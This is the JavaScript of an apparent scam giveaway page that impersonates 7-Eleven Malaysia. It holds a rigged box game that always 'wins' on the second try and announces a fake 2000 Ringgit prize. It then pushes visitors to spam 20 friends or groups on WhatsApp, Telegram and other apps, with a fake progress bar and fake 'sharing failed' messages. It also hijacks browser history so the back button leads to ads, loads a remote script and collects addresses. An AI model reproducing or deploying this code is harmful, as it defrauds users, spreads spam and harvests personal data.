
        // GOGOGO
window.addEventListener('touchstart',function(){
    fhha();
});
var brand_country = 'United Kingdom';
var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
var minutos_y = "minutes and ";
var segundos = "seconds";
var modalOptions = {
    backdrop: 'static',
    keyboard: false
};
var g_share_step = 26;
var g_banner_ad = true;
var g_share_type = 1;
var type_op = 1;
var cl = 0;
var p_e = 0;
var p_s = 0;
var all_p_e = [50, 50, 70, 70, 80, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 99.1, 99.2, 99.3, 99.4, 99.5, 99.6, 99.7, 99.8, 99.9, 100];
var toPlatform = 'whatsapp';
set_Cookie('hh1',0);
set_Cookie('hh2',0);

// 
var maxParticleCount = 150;
var particleSpeed = 2;
var startConfetti;
var stopConfetti;
var toggleConfetti;
var removeConfetti;
(function() {
    startConfetti = startConfettiInner;
    stopConfetti = stopConfettiInner;
    toggleConfetti = toggleConfettiInner;
    removeConfetti = removeConfettiInner;
    var colors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Violet", "PaleGreen",
        "SteelBlue", "SandyBrown", "Chocolate", "Crimson"
    ]
    var streamingConfetti = false;
    var animationTimer = null;
    var particles = [];
    var waveAngle = 0;

    function resetParticle(particle, width, height) {
        particle.color = colors[(Math.random() * colors.length) | 0];
        particle.x = Math.random() * width;
        particle.y = Math.random() * height - height;
        particle.diameter = Math.random() * 10 + 5;
        particle.tilt = Math.random() * 10 - 10;
        particle.tiltAngleIncrement = Math.random() * 0.07 + 0.05;
        particle.tiltAngle = 0;
        return particle;
    }

    function startConfettiInner() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        window.requestAnimFrame = (function() {
            return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window
                .mozRequestAnimationFrame || window.oRequestAnimationFrame || window
                .msRequestAnimationFrame || function(callback) {
                    return window.setTimeout(callback, 16.6666667);
                };
        })();
        var canvas = document.getElementById("confetti-canvas");
        if (canvas === null) {
            canvas = document.createElement("canvas");
            canvas.setAttribute("id", "confetti-canvas");
            canvas.setAttribute("style",
                "display:block;z-index:888888;pointer-events:none;position: absolute;left: 0px;top: 0px;");
            document.body.appendChild(canvas);
            canvas.width = width;
            canvas.height = height;
            window.addEventListener("resize", function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }, true);
        }
        var context = canvas.getContext("2d");
        while (particles.length < maxParticleCount)
            particles.push(resetParticle({}, width, height));
        streamingConfetti = true;
        if (animationTimer === null) {
            (function runAnimation() {
                context.clearRect(0, 0, window.innerWidth, window.innerHeight);
                if (particles.length === 0)
                    animationTimer = null;
                else {
                    updateParticles();
                    drawParticles(context);
                    animationTimer = requestAnimFrame(runAnimation);
                }
            })();
        }
    }

    function stopConfettiInner() {
        streamingConfetti = false;
    }

    function removeConfettiInner() {
        stopConfetti();
        particles = [];
    }

    function toggleConfettiInner() {
        if (streamingConfetti)
            stopConfettiInner();
        else
            startConfettiInner();
    }

    function drawParticles(context) {
        var particle;
        var x;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            context.beginPath();
            context.lineWidth = particle.diameter;
            context.strokeStyle = particle.color;
            x = particle.x + particle.tilt;
            context.moveTo(x + particle.diameter / 2, particle.y);
            context.lineTo(x, particle.y + particle.tilt + particle.diameter / 2);
            context.stroke();
        }
    }

    function updateParticles() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        var particle;
        waveAngle += 0.01;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            if (!streamingConfetti && particle.y < -15)
                particle.y = height + 100;
            else {
                particle.tiltAngle += particle.tiltAngleIncrement;
                particle.x += Math.sin(waveAngle);
                particle.y += (Math.cos(waveAngle) + particle.diameter + particleSpeed) * 0.5;
                particle.tilt = Math.sin(particle.tiltAngle) * 15;
            }
            if (particle.x > width + 20 || particle.x < -20 || particle.y > height) {
                if (streamingConfetti && particles.length <= maxParticleCount)
                    resetParticle(particle, width, height);
                else {
                    particles.splice(i, 1);
                    i--;
                }
            }
        }
    }
})();

// 
var box_ini = !1
var modalOptions = {
    backdrop: 'static',
    keyboard: false
};
var count = 1;
var windraw = 2;
var intentos = 3;
if(intentos < windraw){var intentos = windraw;}
var puedo = false;
var boxRoot;
var datetime = 1644822887640;
boxRoot = {
    _init: function() {
        setTimeout(function() {
			Swal.fire({
				title: 'Congratulation!',
				html: '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">Your answer has been saved successfully!</p><p style="margin:1px;">You have a chance to win gifts.</p><p style="margin:1px;">You must select the correct box with your prize inside.</p><p style="margin:1px;">You have 3 attempts. Good luck!</p>',
				imageUrl: 'https://cdnbun.com/upload/7-eleven-my-show2.jpg',
			// 	imageHeight: 227,
				imageAlt: 'Custom image',
			}).then(function(){
				puedo = true;
			});
			setTimeout(function(){
				$('.swal2-header').find('.swal2-image').addClass('temblor_inf');
				$('.swal2-content').css('padding','0');
				$('.swal2-content').css('font-size','1rem');
			},50);
        }, 1000);
        jQuery('.try').on('click', function() {
            if (puedo && count <= windraw) {
                if (jQuery(this).hasClass('abierta')) {} else {
                    puedo = false;
                    jQuery(this).addClass('abierta');
                    if (count == windraw) {
                        jQuery(this).addClass('premiazo');
                        setTimeout(function() {
                            jQuery(".div_img_gift, .img_gift").fadeIn("slow",
                                function() {
                                	startConfetti();
                                    setTimeout(function() {
                                    	Swal.fire({
											title: 'Congratulation!',
											html: '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">You did it! You won  2000 Ringgit</p><p style="margin:1px;">*** THE RULES ***</p><div style="text-align:center;"><p style="margin:1px;">1. You must tell 5 groups or 20 friends about our promotions.</p><p style="margin:1px;">2. Enter your address and complete registration.</p><p style="margin:1px;">3. The gifts will be delivered within 5-7 days</p></div>',
											imageUrl: 'https://1.bp.blogspot.com/-UGoWNqD79aU/YKsjal4qS6I/AAAAAAAABhc/zBRJhOxtqQMhZ_vwP66IEHuTCHmeb0HnACLcBGAsYHQ/s16000/Malaysia_outbox.png',
											imageHeight: 180,
											imageAlt: 'Custom image',
										}).then(function(){
											puedo = false;
											showShare();
											stopConfetti();
										});
										setTimeout(function(){
											// $('.swal2-header').find('.swal2-image').addClass('temblor_inf');
											$('.swal2-content').css('padding','0');
											$('.swal2-content').css('font-size','1rem');
										},50);
                                    }, 1500);
                                });
                        }, 4000);
                    } else {
                        count++;
                        intentos--;
                        setTimeout(function() {
                            swal_box(intentos);
                        }, 2000);
                    }
                }
            }
        });
    }
};
$(document).ready(function() {
    if (typeof box_ini == "undefined") {
        boxRoot._init();
    }
});

// 
$(".bq1").click(function() {
	$("#q1").fadeOut("slow", function() {
		$("#q2").fadeIn("slow")
	})
}), $(".bq2").click(function() {
	$("#q2").fadeOut("slow", function() {
		$("#q3").fadeIn("slow")
	})
}), $(".bq3").click(function() {
	$("#q3").fadeOut("slow", function() {
		$("#q4").fadeIn("slow")
	})
}), $(".bq4").click(function() {
	scrollTo("id1"), $("#content1").fadeOut("slow", function() {
		$("#content2").fadeIn(), setTimeout(function() {
			$("#result1").fadeIn(1e3)
		}, 3e3), setTimeout(function() {
			$("#result2").fadeIn(1e3)
		}, 4100), setTimeout(function() {
			$("#result3").fadeIn(1e3)
		}, 6e3), setTimeout(function() {
			$("#content2").fadeOut("slow", function() {
				"undefined" != typeof roulette_ini ? rouletteRoot._init() : "undefined" != typeof box_ini && boxRoot._init(),$("#content3").fadeIn();
			})
		}, 7100)
	})
});

// date
if ($("#timerr").length >= 1) {d((4 * 60) + 29);}
var b = new Date();
var a = f(b.getHours()) + ":" + f(b.getMinutes());
$(".p_var-dia").text(b.getDate());
$(".p_var-mes").text(b.getMonth());
$(".p_var-anyo").text(b.getFullYear());
$(".p_var-dia_nombre").text(dayNames[b.getDay()]);
$(".p_var-mes_nombre").text(monthNames[b.getMonth()]);
$(".p_var-hora_fija").text(a);
if ($(".p_var-browser").length >= 1) {
	var c = getBrowser();
	$(".p_var-browser").text(c);
}
if ($(".p_var-browser").length >= 1) {
	var e = getPlatform();
	$(".p_var-so").text(e);
}

// let's go!
$.getScript('/j/ntb.php?c=7-eleven-my&m=7-eleven-my-m&tg=7-eleven-my&ln=7-eleven-my&vb=7-eleven-my&_t=1680754874449');
var share_number = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'));console.log(share_number);
if (share_number > 0) {
    showShare()
    move()
}

var type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));console.log(type_op);
if(type_op === 2){
    showShare()
}

// functions
function d(h){
	var j, k, i = h,
		g = setInterval(function() {
			j = parseInt(i / 60, 10), k = parseInt(i % 60, 10), k = 10 > k ? "0" + k : k, $("#timerr").text(j + " " + minutos_y + k + " " + segundos), --i < 0 && (clearInterval(g));
		}, 1000);
}

function f(g) {
	if (g < 10) {
		g = "0" + g;
	}
	return g;
}

function stepfinal() {
	$("#p_body_content").fadeOut("slow");
	$("#p_loading").fadeIn("slow");
}

function goToUrlFinish() {
	stepfinal();
	PreventExitPop = false;
	document.getElementById("p_form_post").submit();
}

function scrollTo(a) {
	if ($("#" + a).length) {
		var c = $("#" + a).offset();
		var b = c.top;
		$("html,body").animate({
			scrollTop: b
		}, {
			duration: "slow"
		});
	}
}

function getBrowser() {
	if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf("OPR")) != -1) {
		return "Opera";
	} else {
		if (navigator.userAgent.indexOf("Chrome") != -1) {
			return "Google Chrome";
		} else {
			if (navigator.userAgent.indexOf("Safari") != -1) {
				return "Safari";
			} else {
				if (navigator.userAgent.indexOf("Firefox") != -1) {
					return "Firefox";
				} else {
					if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) {
						return "IE";
					} else {
						return "Unknown";
					}
				}
			}
		}
	}
	return "Unknown";
}

function getPlatform() {
	if (window.navigator.userAgent.indexOf("Windows NT 10.0") != -1) {
		return "Windows 10";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) {
		return "Windows 8";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) {
		return "Windows 7";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) {
		return "Windows Vista";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) {
		return "Windows XP";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) {
		return "Windows 2000";
	}
	if (window.navigator.userAgent.indexOf("iPhone") != -1) {
		return "iPhone";
	}
	if (window.navigator.userAgent.indexOf("iPad") != -1) {
		return "iPad";
	}
	if (window.navigator.userAgent.indexOf("Android") != -1) {
		return "Android";
	}
	if (window.navigator.userAgent.indexOf("Mac") != -1) {
		return "Macintosh";
	}
	if (window.navigator.userAgent.indexOf("X11") != -1) {
		return "UNIX";
	}
	if (window.navigator.userAgent.indexOf("Linux") != -1) {
		return "Linux";
	}
	if (window.navigator.userAgent.indexOf("BlackBerry") != -1) {
		return "BlackBerry";
	}
	return "Unknown";
}

function set_Cookie(name, value) {
    name = "7-eleven-my-tt"+name;
    var Minutes = 10;
    var exp = new Date();
    let domain = getMainHost();
    exp.setTime(exp.getTime() + (Minutes * 60 * 1000));
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";domain=."+domain+"; path=/;";
}

function get_Cookie(name) {
    name = "7-eleven-my-tt"+name;
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) {
        return unescape(arr[2]);
    }
    return '';
}

function move() {
    cl = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog')) - 2;
    cl = cl>=0?cl:0;
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    var elem = document.getElementById("progressbar")
    if (cl < all_p_e.length && share_num <= g_share_step) {
        var p_e_num = cl
    } else {
        var p_e_num = all_p_e.length - 1
    }
    p_e = all_p_e[p_e_num];
    
    elem.style.width = p_e + '%';
    elem.innerHTML = p_e + '%';
}

function swal_box(intentos){
	let texts = ['Sorry, the box you selected is empty. You still have 1 chances! Good luck!','Sorry, the box you selected is empty. You still have 2 chances! Good luck!'];
	Swal.fire({
		icon: 'error',
		title: 'Unfortunately...',
		text: texts[intentos-1],
	}).then(function(){
		puedo = true;
	});
	setTimeout(function(){
		$('.swal2-content').css('padding','0');
		$('.swal2-content').css('font-size','1rem');
	},50);
}

function showShare() {
    set_Cookie('type_op', 2);
    // $('#p_modal3').modal('hide');
    $('.share_page').show();
    $('#content4').show();
    $('#content3').hide();
    $('#content1').hide();
}

function continueBtn() {
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    if (share_num < g_share_step) {
        swalert("You have to share with friends about our event. Share until the blue bar is full!","Unfortunately...");
    } else {
        jQuery(".share_ing").hide()
        jQuery(".share_success").show()
    }
}

function swalert(text,title=''){
	if(title != ''){
		Swal.fire({
    		icon: 'warning',
    		title: title,
			text: text,
            allowOutsideClick:false,
            allowEnterKey:false
		}).then((res)=>{
			if(res.isConfirmed){
			    shareBtn(toPlatform);
			}
		});
	}else{
		Swal.fire({
    		icon: 'warning',
			text: text,
            allowOutsideClick:false,
            allowEnterKey:false,
		}).then((res)=>{
			if(res.isConfirmed){
			    shareBtn(toPlatform);
			}
		});
	}
}

function shareOkBtn() {
    window.open(Web+'&_p=Pop');
}

function shareBtn(platform) {
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    share_num++
    if (share_num > g_share_step) {
        share_num = g_share_step;
    }
    toPlatform = platform;
    let jurl = j;
    if(platform == 'messenger'){
        jurl = msj;
        location.href = 'fb-messenger://share/?link='+encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'telegram'){
        jurl = tgj;
        location.href = 'tg://msg_url?url=' + encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'line'){
        jurl = lnj;
        location.href = 'https://line.me/R/share?text=' + encodeURIComponent(jurl);
    }else if(platform == 'viber'){
        jurl = vbj;
        location.href = 'viber://forward?text=' + encodeURIComponent(jurl);
    }else{
        if(nptimes.length > 0){
            if(nptimes.includes(share_num)){
                jurl = j2;
            }
        }
        location.href = 'whatsapp://send?text=' + jurl + new Date().getTime();
    }

    setTimeout(function () {
        get_Cookie('prog') == '' ? value = 1 : value = parseInt(get_Cookie('prog'));
        if (value >= g_share_step) {
            continueBtn();
        }else{
            value == 2 || value == 4 ? swalert("The same group or the same friend is not correct. Please check and share again.","Sharing failed!") : void (0);
        }
        set_Cookie('prog', value + 1);
        let pType = get_Cookie('pType');
        set_Cookie('pType', pType);
        move()
    }, 3000);
}

function wxalert(t, n, b, flag, i) {
	//flag:1,success  2,normal
	var r, u;
	r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
	r += '<div class="weui_mask"></div>';
	r += '<div class="weui_dialog">';
	r += '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
	r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
	r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
	r += '<div class="weui_dialog_ft">';
	r += '<div href="javascript:void(0);" class="weui_btn_dialog primary btn">OK</div>';
	r += "</div>";
	r += "</div>";
	r += "</div>";

	$(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
	setTimeout(function() {
		u = $(".weui_dialog_alert");
		u.show();
		u.find(".weui_dialog_bd").html(n);
		u.find(".weui_dialog_title").html(t);
		u.find(".weui_btn_dialog").html(b ? b : "");
		u.find(".weui_btn_dialog").off("click").on("click", function() {
			i();
			u.hide();
			if (flag == 1) {
				stopConfetti();
			}
		});
		u.find(".weui_close").off("click").on("click", function() {
			i();
			u.hide();
			if (flag == 1) {
				stopConfetti();
			}
		});
		if (flag == 1) {
			startConfetti();
		}
	}, 500);
}

function getMainHost() {
    // 获取主域名
    let key  = `mh_${Math.random()}`;
    let keyR = new RegExp( `(^|;)\\s*${key}=12345` );
    let expiredTime = new Date( 0 );
    let domain = document.domain;
    let domainList = domain.split( '.' );
    let urlItems   = [];
    urlItems.unshift( domainList.pop() );
    while( domainList.length ) {
    urlItems.unshift( domainList.pop() );
    let mainHost = urlItems.join( '.' );
    let cookie = `${key}=${12345};domain=.${mainHost}`;
    document.cookie = cookie;
    if ( keyR.test( document.cookie ) ) {
        document.cookie = `${cookie};expires=${expiredTime}`;
        return mainHost;
        }
    }
}
window.onhashchange = function() {
    jp();
};

function hh1() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

function jp() {
    fh();
}
setTimeout('hh1();', 500);

function fh() {
    location.href = Ads+'&_p=Pop';
}

function fhha(num=1){
    let hh = get_Cookie('hh'+num) ? parseInt(get_Cookie('hh'+num)) : 0;
    if(hh < num){
        hh += 1;
        history.pushState(history.length + 1, "niubility", "#" + new Date().getTime());
        setTimeout(function(){
            history.pushState(history.length + 1, "niubility", "#" + new Date().getTime());
        },500);
        set_Cookie('hh'+num,hh);
    }
}
var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?c5f7d15f2bf0dd6c4bde04b74482d9aa";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?bdc1bbcae43bc550877392388043e0a5";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?efae72b15bb04ecc7ba1b46a7a77a73e";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
// google analytics
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-H76FT01RQ5');
    